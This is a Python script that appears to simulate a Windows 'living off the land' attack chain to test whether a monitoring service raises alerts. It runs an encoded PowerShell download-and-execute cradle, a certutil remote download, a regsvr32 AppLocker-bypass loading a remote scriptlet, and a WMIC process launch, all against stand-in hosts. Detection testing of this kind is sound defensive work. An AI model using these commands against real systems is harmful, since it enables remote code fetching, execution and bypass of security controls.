import os
import time
import subprocess
import sys

def print_header(message):
    print("\n" + "=" * 50)
    print(f"  {message}")
    print("=" * 50)

def run_command(command, wait_time=2):
    print(f"\n> Executing: {command}")
    subprocess.run(command, shell=True)
    time.sleep(wait_time)  # Give the monitor time to detect

def simulate_attack():
    print_header("LOLBin Attack Simulation")
    print("This will simulate a realistic LOLBin attack chain.")
    print("Make sure your monitoring service is running!")
    
    input("\nPress Enter to begin the attack simulation...")
    
    # Stage 1: PowerShell encoded command execution
    print_header("Stage 1: PowerShell Encoded Command")
    encoded_command = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAJwApAA=="
    run_command(f'powershell.exe -enc {encoded_command}')
    
    # Stage 2: CertUtil for downloading
    print_header("Stage 2: CertUtil File Download")
    run_command('certutil.exe -urlcache -f http://example.com/payload.txt C:\\temp\\harmless.txt')
    
    # Stage 3: Regsvr32 AppLocker bypass
    print_header("Stage 3: Regsvr32 AppLocker Bypass")
    run_command('regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll')
    
    # Stage 4: WMIC process creation
    print_header("Stage 4: WMIC Process Creation")
    run_command('wmic.exe process call create "calc.exe"')
    
    # Stage 5: PowerShell obfuscation techniques
    print_header("Stage 5: PowerShell Obfuscation")
    obfuscated_cmd = 'powershell.exe "Write-Host (`"H`" + `"ell`" + `"o`")"'
    run_command(obfuscated_cmd)
    
    print_header("Attack Simulation Complete")
    print("Check your notification system and dashboard for alerts!")

if __name__ == "__main__":
    simulate_attack()